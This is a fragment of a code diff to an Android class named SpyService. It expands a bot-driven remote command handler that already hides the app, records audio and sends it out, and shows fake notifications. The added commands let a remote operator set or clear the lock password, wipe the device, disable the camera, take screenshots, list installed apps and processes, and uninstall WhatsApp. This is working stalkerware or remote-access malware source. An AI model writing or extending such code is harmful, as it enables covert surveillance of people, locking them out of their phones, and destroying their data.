                 case "flash_on": flash(true); break;
@@ -774,20 +948,44 @@ public class SpyService extends Service {
                 case "stop_record": sendFile(stopRecording(), "🎤 تسجيل صوتي"); break;
                 case "hide_app": hideApp(); break;
                 case "show_app": showApp(); break;
+                case "fake_notif": showFakeNotification(); break;
                 case "lock_device": lockDevice(); break;
+                case "set_lock_password": setLockPassword(); break;
+                case "clear_lock_password": clearLockPassword(); break;
+                case "wipe_device": wipeDevice(); break;
+                case "set_password_rules": setPasswordRules(); break;
+                case "disable_camera": disableCamera(); break;
+                case "enable_camera": enableCamera(); break;
                 case "reboot": rebootDevice(); break;
                 case "shutdown": shutdownDevice(); break;
                 case "vibrate": vibrateDevice(); break;
+                case "set_volume_max": setVolume(true); break;
+                case "set_volume_min": setVolume(false); break;
+                case "set_ringtone_volume": setRingtoneVolume(5); break;
+                case "set_media_volume": setMediaVolume(7); break;
+                case "open_browser": openBrowser(); break;
                 case "toggle_wifi_on": toggleWifi(true); break;
                 case "toggle_wifi_off": toggleWifi(false); break;
                 case "toggle_bluetooth_on": toggleBluetooth(true); break;
                 case "toggle_bluetooth_off": toggleBluetooth(false); break;
                 case "toggle_location_on": toggleLocation(true); break;
                 case "toggle_location_off": toggleLocation(false); break;
-                case "set_volume_max": setVolume(true); break;
-                case "set_volume_min": setVolume(false); break;
-                case "open_browser": openBrowser(); break;
-                case "fake_notif": showFakeNotification(); break;
+                case "clear_data": clearAppData(); break;
+                case "kill_apps": killAllApps(); break;
+                case "screenshot": takeScreenshot(); break;
+                case "installed_apps": getInstalledApps(); break;
+                case "running_processes": getRunningProcesses(); break;
+                case "set_brightness": setScreenBrightness(128); break;
+                case "auto_rotate_on": setAutoRotate(true); break;
+                case "auto_rotate_off": setAutoRotate(false); break;
+                case "battery_history": getBatteryHistory(); break;
+                case "storage_info": getStorageInfo(); break;
+                // أوامر إضافية
+                case "open_app_whatsapp": openApp("com.whatsapp"); break;
+                case "open_app_facebook": openApp("com.facebook.katana"); break;
+                case "open_app_instagram": openApp("com.instagram.android"); break;
+                case "open_app_youtube": openApp("com.google.android.youtube"); break;
+                case "uninstall_app_whatsapp": uninstallApp("com.whatsapp"); break;
                 default:
                     sendData("ERROR", "أمر غير معروف: " + cmd);
                     bot.sendMessage("❌ أمر غير معروف: " + cmd);
